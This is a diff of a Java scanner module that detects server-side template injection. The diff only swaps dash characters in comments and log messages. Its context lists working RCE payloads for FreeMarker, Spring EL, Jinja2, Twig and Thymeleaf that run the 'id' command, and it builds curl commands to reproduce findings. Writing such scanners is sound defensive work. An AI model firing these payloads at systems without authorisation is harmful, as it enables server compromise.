@@ -30,7 +30,7 @@ public class SstiModule implements Scanner {
     private record SstiProbe(String payload, String engine) {
     }
 
-    // Phase 1: math detection probes — look for "2401" (7^4) in response.
+    // Phase 1: math detection probes -- look for "2401" (7^4) in response.
     // 2401 has near-zero collision probability vs "49" which appears in
     // pagination/IDs/years.
     private static final List<SstiProbe> DETECTION_PROBES = List.of(new SstiProbe("${7*7*7*7}", "FreeMarker/Spring"),
@@ -38,13 +38,14 @@ public class SstiModule implements Scanner {
             new SstiProbe("${{7*7*7*7}}", "Thymeleaf/Spring"), new SstiProbe("<%= 7*7*7*7 %>", "ERB/EJS"),
             new SstiProbe("{{7*'7'}}", "Twig (confirma)"));
 
-    // Phase 2: engine-specific RCE probes — run after detection confirms an engine.
+    // Phase 2: engine-specific RCE probes -- run after detection confirms an
+    // engine.
     // Payloads attempt command output; look for uid= or root:x: in response.
     private record RceProbe(String enginePrefix, String payload, String description) {
     }
 
     private static final List<RceProbe> RCE_PROBES = List.of(
-            // FreeMarker — Execute?new() is the classic FreeMarker RCE gadget
+            // FreeMarker -- Execute?new() is the classic FreeMarker RCE gadget
             new RceProbe("FreeMarker", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                     "FreeMarker Execute?new() → executa 'id'"),
             // Spring EL via StreamUtils
@@ -53,9 +54,9 @@ public class SstiModule implements Scanner {
                             + "T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream(),"
                             + "T(java.nio.charset.Charset).forName(\"UTF-8\"))}",
                     "Spring EL → Runtime.exec('id')"),
-            // Jinja2 — config global dump (safer than subprocess, confirms deeper access)
+            // Jinja2 -- config global dump (safer than subprocess, confirms deeper access)
             new RceProbe("Jinja2", "{{config}}", "Jinja2 → config object dump"),
-            // Twig — _self.env access
+            // Twig -- _self.env access
             new RceProbe("Twig", "{{_self.env.getExtension(\"Twig\\\\Extension\\\\CoreExtension\")|json_encode}}",
                     "Twig → _self.env extension access"),
             // Thymeleaf expression preprocessing
@@ -107,10 +108,10 @@ public class SstiModule implements Scanner {
                     String rceEvidence = tryRceProbes(ctx, hc, base, path, param, engine, baseline, log);
 
                     if (rceEvidence != null) {
-                        log.accept("[!!!] SSTI RCE: CONFIRMADO — " + engine + " em " + endpoint);
-                        findings.add(Finding.of("SSTI", endpoint, "SSTI RCE CONFIRMADO — " + engine, Severity.CRITICAL,
+                        log.accept("[!!!] SSTI RCE: CONFIRMADO -- " + engine + " em " + endpoint);
+                        findings.add(Finding.of("SSTI", endpoint, "SSTI RCE CONFIRMADO -- " + engine, Severity.CRITICAL,
                                 "Engine: " + engine + " | RCE evidence: " + rceEvidence + " | URL: " + base + endpoint,
-                                "RCE confirmado via SSTI (" + engine + ") — execução de código arbitrário no servidor",
+                                "RCE confirmado via SSTI (" + engine + ") -- execução de código arbitrário no servidor",
                                 "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param + "="
                                         + probe.payload() + "'",
                                 "Nunca renderize input do usuário em templates; use sandbox isolado; "
@@ -118,10 +119,10 @@ public class SstiModule implements Scanner {
                                 _cweId, _cweTitle, _cveVector, _score));
                     } else {
                         findings.add(Finding.of("SSTI", endpoint,
-                                "SSTI — Template Injection detectado (" + engine + ")", Severity.CRITICAL,
+                                "SSTI -- Template Injection detectado (" + engine + ")", Severity.CRITICAL,
                                 "Payload: " + probe.payload() + " → resposta contém '2401' | Engine: " + engine
                                         + " | URL: " + base + endpoint,
-                                "Server-Side Template Injection — equivale a RCE na engine " + engine
+                                "Server-Side Template Injection -- equivale a RCE na engine " + engine
                                         + ". Payloads RCE conhecidos incluem: FreeMarker Execute?new(), "
                                         + "Spring T(Runtime).exec(), Jinja2 subclasses gadget",
                                 "curl -G '" + base + path + "' \\\n" + "  --data-urlencode '" + param + "="
